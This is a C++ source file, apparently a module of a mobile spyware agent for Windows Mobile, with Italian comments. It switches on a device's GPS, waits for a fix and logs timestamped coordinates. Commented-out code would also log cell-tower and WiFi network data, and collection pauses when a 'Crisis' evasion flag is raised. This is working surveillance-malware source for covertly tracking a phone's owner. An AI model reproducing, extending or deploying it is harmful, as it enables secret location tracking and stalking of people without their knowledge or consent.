#include "Modules.h"
#include "Common.h"
#include "Module.h"
#include "Log.h"
#include "Observer.h"
#include "Device.h"
#include "GPS.h"
#include "Ril.h"
#include "Cell.h"
#include "WiFi.h"

#include "FunctionFunc.h"

DWORD WINAPI PositionModule(LPVOID lpParam) {
#define GPS_POLL_TIMEOUT 1000 * 60 * 14 // Tempo massimo di wait prima che il GPS venga spento
	BOOL gps, cell, wifi;

	Module *me = (Module *)lpParam;
	Configuration *conf = me->getConf();
	HANDLE eventHandle;
	GPS *gpsObj = NULL;
	///Cell *cellObj = NULL;
	Device *deviceObj = Device::self();
	Status *statusObj = Status::self();
	/***
	CWifi wifiObj;
	DWORD dwMCC, dwMNC;
	wstring wifiAdapter;
	BOOL cellOk = FALSE;
	***/
	BOOL gpsOk = FALSE;
	

	try {
		gps = conf->getBool(L"gps");
	} catch (...) {
		gps = FALSE;
	}
/***
	try {
		cell = conf->getBool(L"cell");
	} catch (...) {
		cell = FALSE;
	}

	try {
		wifi = conf->getBool(L"wifi");
	} catch (...) {
		wifi = FALSE;
	}
***/
	me->setStatus(MODULE_RUNNING);
	eventHandle = me->getEvent();

	DBG_TRACE(L"Debug - PositionGrabber.cpp - Position Module started\n", 5, FALSE);
/***	
	wifiObj.GetWiFiAdapterName(wifiAdapter);
	
	wstring wifiAdapterGuid = L"{98C5250D-C29A-4985-AE5F-AFE5367E5006}\\";
	wifiAdapterGuid += wifiAdapter;


	Log logGSM, logWiFi;
	***/
	Log logGPS;
	LocationAdditionalData locAdditional;

	UINT uType;
	SYSTEMTIME st;
	FILETIME ft;
	BOOL bGSMEmpty = TRUE, bGPSEmpty = TRUE, bWiFiEmpty = TRUE, bCrisis = FALSE;

	// GPS e' un log sequenziale
	typedef struct _GPSInfo {
		UINT uSize;
		UINT uVersion;
		FILETIME ft;
		GPS_POSITION gps;
		DWORD dwDelimiter;
	} GPSInfo;
/***
	// GSM e' un log sequenziale
	typedef struct _GSMInfo {
		UINT uSize;
		UINT uVersion;
		FILETIME ft;
		RILCELLTOWERINFO cell;
		DWORD dwDelimiter;
	} GSMInfo;

	// WiFi e' un log unico per acquisizione
	typedef struct _WiFiInfo {
		UCHAR MacAddress[6];	// BSSID
		UINT uSsidLen;			// SSID length
		UCHAR Ssid[32];			// SSID
		INT iRssi;				// Received signal strength in dBm
	} WiFiInfo;

	GSMInfo gsmlInfo;
	WiFiInfo wifiInfo;
***/

	GPSInfo gpsInfo;


	// E' singleton e non va distrutta (30 sec di timeout, 1 sec di max age)
	do {
		if (gps == FALSE)
			break;

		gpsObj = GPS::self(30000, 1000);

		if (gpsObj == NULL)
			break;
		
		if (gpsObj->Start() == FALSE )
			break;

		gpsOk = TRUE;
	} while (0);
/***
	do {
		if (cell == FALSE)
			break;

		cellObj = Cell::self(30000);

		if (cellObj == NULL)
			break;

		cellObj->Start();
		deviceObj->RefreshData();

		// Prendiamo il MCC ed il MNC
		dwMCC = deviceObj->GetMobileCountryCode();
		dwMNC = deviceObj->GetMobileNetworkCode();

		cellOk = TRUE;
	} while (0);
***/
/***
	// Creiamo i log per ogni tipo attivato
	if (cell) {
		locAdditional.uVersion = LOG_LOCATION_VERSION;
		locAdditional.uType = LOGTYPE_LOCATION_GSM;
		locAdditional.uStructNum = 0;

		if (logGSM.CreateLog(LOGTYPE_LOCATION_NEW, (BYTE *)&locAdditional, sizeof(LocationAdditionalData), FLASH) == FALSE) {
			if (gpsOk)
				gpsObj->Stop();

			if (cellOk)
				cellObj->Stop();

			me->setStatus(MODULE_STOPPED);
			return 0;
		}
	}
***/
	if (gpsOk) {
		locAdditional.uVersion = LOG_LOCATION_VERSION;
		locAdditional.uType = LOGTYPE_LOCATION_GPS;
		locAdditional.uStructNum = 0;

		if (logGPS.CreateLog(LOGTYPE_LOCATION_NEW, (BYTE *)&locAdditional, sizeof(LocationAdditionalData), FLASH) == FALSE) {
			gpsObj->Stop();
/***
			if (cellOk)
				cellObj->Stop();

			logGSM.CloseLog(TRUE);
***/
			me->setStatus(MODULE_STOPPED);
			return 0;
		}
	}

	/**
	 * LOG FORMAT
	 *
	 * DWORD|STRUCT
	 *
	 * DWORD indica il tipo di struttura che segue, STRUCT e' la struttura (GPS o CELL)
	 */
/***
	if (cellOk) {
		if (cellObj->getCELL(&gsmlInfo.cell)) {
			uType = TYPE_CELL;

			gsmlInfo.uSize = sizeof(gsmlInfo);
			gsmlInfo.uVersion = CELL_VERSION;

			// Scriviamo il tipo di struttura e poi i dati
			DWORD dwFields =  RIL_PARAM_CTI_LOCATIONAREACODE | RIL_PARAM_CTI_CELLID;

			if ((gsmlInfo.cell.dwParams & RIL_PARAM_CTI_RXLEVEL) == RIL_PARAM_CTI_RXLEVEL) {
				// Convertiamo da 0..63 a dBm
				gsmlInfo.cell.dwRxLevel -= 110;
			}

			if ((gsmlInfo.cell.dwParams & dwFields) == dwFields && 
				!(gsmlInfo.cell.dwLocationAreaCode == 0 && gsmlInfo.cell.dwCellID == 0)) {

					// Se non abbiamo MCC e MNC, usiamo quelli che abbiamo derivato dall'IMSI
					// Sui network CDMA: CID -> BID, LAC -> NID, MNC -> SID, MCC -> MCC
					if (gsmlInfo.cell.dwMobileCountryCode == 0)
						gsmlInfo.cell.dwMobileCountryCode = dwMCC;

					if (gsmlInfo.cell.dwMobileNetworkCode == 0)
						gsmlInfo.cell.dwMobileNetworkCode = dwMNC;

					if (logGSM.WriteLog((BYTE *)&uType, sizeof(uType))) {
						GetSystemTime(&st);
						SystemTimeToFileTime(&st, &ft);

						gsmlInfo.ft.dwHighDateTime = ft.dwHighDateTime;
						gsmlInfo.ft.dwLowDateTime = ft.dwLowDateTime;
						gsmlInfo.dwDelimiter = LOG_DELIMITER;

						if (logGSM.WriteLog((BYTE *)&gsmlInfo, sizeof(gsmlInfo)))
							bGSMEmpty = FALSE;
					}
			} 
		} 
	}
	
	// Senza questo Sleep() non entra nella if() successiva...
	_Sleep(500);

	// Acquisiamo le reti WiFi
	if (wifi) {
		struct BSSIDInfo bssid_list[20];
		DWORD dwReturned = 0;
		CEDEVICE_POWER_STATE powerState;

		ZeroMemory(&bssid_list, sizeof(bssid_list));

		if (wifiAdapter.empty() == false) {
			powerState = deviceObj->GetDevicePowerState(wifiAdapterGuid);

			if (powerState < D2) {
				wifiObj.RefreshBSSIDs(wifiAdapter);
				wifiObj.GetBSSIDs(wifiAdapter, (BSSIDInfo *)&bssid_list, sizeof(bssid_list), dwReturned);

				if (dwReturned) {
					bWiFiEmpty = TRUE;

					locAdditional.uVersion = LOG_LOCATION_VERSION;
					locAdditional.uType = LOGTYPE_LOCATION_WIFI;
					locAdditional.uStructNum = dwReturned;

					if (logWiFi.CreateLog(LOGTYPE_LOCATION_NEW, (BYTE *)&locAdditional, sizeof(LocationAdditionalData), FLASH) == TRUE) {
						for (UINT i = 0; i < dwReturned; i++) {
							if (bssid_list[i].SSID[0]) {
								CopyMemory(&wifiInfo.MacAddress, bssid_list[i].BSSID, 6);
								wifiInfo.uSsidLen = wcslen(bssid_list[i].SSID);
								sprintf((CHAR *)wifiInfo.Ssid, "%S", bssid_list[i].SSID);
								wifiInfo.iRssi = bssid_list[i].RSSI;

								if (logWiFi.WriteLog((PBYTE)&wifiInfo, sizeof(wifiInfo)) == TRUE && dwReturned)
									bWiFiEmpty = FALSE;
							}
						}

						logWiFi.CloseLog(bWiFiEmpty);
					}
				}
			}
		}
	}
***/
	// Senza questo Sleep() non entra nella if() successiva...
	_Sleep(500);

	if (gpsOk) {
		// Accendiamo il GPS se polliamo su lunghi intervalli
		DWORD now = _GetTickCount();

		gpsObj->Start();

		// Polla al massimo per GPS_POLL_TIMEOUT ms
		do {
			// Controlliamo se c'e' Crisis
			if ((statusObj->Crisis() & CRISIS_POSITION) == CRISIS_POSITION)
				break;

			// Attendiamo che fixi
			if (gpsObj->getGPS(&gpsInfo.gps)) {
				DWORD dwFields = GPS_VALID_LATITUDE | GPS_VALID_LONGITUDE;

				// Logga la coordinata solo se abbiamo latitutine/longitudine valida e fix 3D
				if ((gpsInfo.gps.dwValidFields & dwFields) == dwFields && gpsInfo.gps.FixType == GPS_FIX_3D)
					break;
			}

			_WaitForSingleObject(eventHandle, 30000);

			if (me->shouldStop()) {
				DBG_TRACE(L"Debug - PositionGrabber.cpp - Position Module is Closing\n", 1, FALSE);
/***
				if (cellOk && cellObj->RadioReady())
					cellObj->Stop();
***/
				if (gpsOk && gpsObj->GpsReady())
					gpsObj->Stop();

///				logGSM.CloseLog(bGSMEmpty);
				logGPS.CloseLog(bGPSEmpty);
///				logWiFi.CloseLog(bWiFiEmpty);

				me->setStatus(MODULE_STOPPED);
				return 0;
			}

			if (me->shouldCycle()) {
///				logGSM.CloseLog(bGSMEmpty);
				logGPS.CloseLog(bGPSEmpty);
///				logWiFi.CloseLog(bWiFiEmpty);

/***
				locAdditional.uType = LOGTYPE_LOCATION_GSM;
				locAdditional.uStructNum = 0;
				logGSM.CreateLog(LOGTYPE_LOCATION_NEW, (BYTE *)&locAdditional, sizeof(LocationAdditionalData), FLASH);
***/
				locAdditional.uType = LOGTYPE_LOCATION_GPS;
				locAdditional.uStructNum = 0;
				logGPS.CreateLog(LOGTYPE_LOCATION_NEW, (BYTE *)&locAdditional, sizeof(LocationAdditionalData), FLASH);

				bGPSEmpty = bGPSEmpty = TRUE;
				DBG_TRACE(L"Debug - PositionGrabber.cpp - Position Module, log cycling\n", 1, FALSE);
			}

			// Controlliamo se c'e' Crisis
			if ((statusObj->Crisis() & CRISIS_POSITION) == CRISIS_POSITION)
				break;

		// Se non abbiamo superato il tempo di timeout proseguiamo col loop
		} while(_GetTickCount() - now < GPS_POLL_TIMEOUT);

		if (gpsObj->getGPS(&gpsInfo.gps)) {
			uType = TYPE_GPS;

			gpsInfo.uSize = sizeof(gpsInfo);
			gpsInfo.uVersion = GPS_VERSION;

			// Scriviamo il tipo di struttura e poi i dati
			DWORD dwFields = GPS_VALID_LATITUDE | GPS_VALID_LONGITUDE;

			// Logga la coordinata solo se abbiamo latitutine/longitudine valida e fix 3D
			if ((gpsInfo.gps.dwValidFields & dwFields) == dwFields && gpsInfo.gps.FixType == GPS_FIX_3D) {
				if (logGPS.WriteLog((BYTE *)&uType, sizeof(uType))) {
					GetSystemTime(&st);
					SystemTimeToFileTime(&st, &ft);

					gpsInfo.ft.dwHighDateTime = ft.dwHighDateTime;
					gpsInfo.ft.dwLowDateTime = ft.dwLowDateTime;
					gpsInfo.dwDelimiter = LOG_DELIMITER;

					if (logGPS.WriteLog((BYTE *)&gpsInfo, sizeof(gpsInfo)))
						bGPSEmpty = FALSE;
				}
			}
		}

		gpsObj->Stop();
	}

	me->setStatus(MODULE_STOPPED);
	return 0;
}								
